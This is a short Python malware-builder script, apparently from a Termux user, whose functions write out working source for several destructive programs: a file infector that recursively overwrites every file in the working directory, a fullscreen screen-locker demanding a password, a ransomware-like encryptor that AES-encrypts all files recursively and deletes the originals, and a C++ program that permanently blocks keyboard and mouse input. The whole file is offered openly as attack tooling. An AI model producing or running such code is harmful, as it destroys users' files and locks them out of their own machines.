import requests
import os,sys
def make_virus():
	print('название:')
	file = input()
	with open(str(file),'w') as makes:
		makes.write('''
import os,sys
def virus(python):
	text = 'ты заражён'
	origin_code = ''
	with open(str(python),'r') as read:
		for line in read:
			origin_code+=line
	with open(str(python),'w') as write:
		write.write(text+'\n'+origin_code)
def walk(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir,name)
		if os.path.isfile(path): virus(path)
		else:walk(path)
walk(os.getcwd())
''')
def make_winlocker():
	print('название:')
	file = input()
	with open(str(file),'w') as win:
		win.write('''
def call():
	txt = entry.get()
	if txt == 'hello':
		root.attributes('-fullscreen',False)
	else:
		root.update()
from tkinter import *
root = Tk()
root.title('winlock')
root.config(bg='black')
root.attributes('-fullscreen',True)
l1=Label(text='WINDOWS BLOCKED',bg='black',fg='red')
l2=Label(text='WRITE THE PASSWORD AND CLICK BUTTON',bg='black',fg='red')
entry=Entry()
btn=Button(root,text='unblocked')
btn.bind('<Button-1>',call)
l1.pack()
l2.pack()
entry.pack()
btn.pack()
root.mainloop()
''')
def make_chipher():
	print('название:')
	file = input()
	with open(str(file),'w') as chiph:
		chiph.write('''
import os,sys
import pyAesCrypt
def crypt(file):
	password = 'hello'
	bufferSize = 512*1024
	pyAesCrypt.encryptFile(str(file),str(file)+'.crp',password,bufferSize)
	os.remove(file)
def walk(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir,name)
		if os.path.isfile(path): crypt(path)
		else:walk(path)
walk(os.getcwd())
''')
def make_cpp():
	print('название:')
	file = input()
	with open(str(file),'w') as cpp:
		cpp.write('''
#include <windows.h>
using namespace std;
int main()
{
	while (true)
	{
		BlockInput(true);
	}
}
''')
def pars():
	sait = input('саит:')
	r = requests.get(sait)
	with open('body.txt','w') as par:
		par.write(r.text)
def installer():
	os.system('python /data/data/com.termux/files/home/python_script/installer.py')
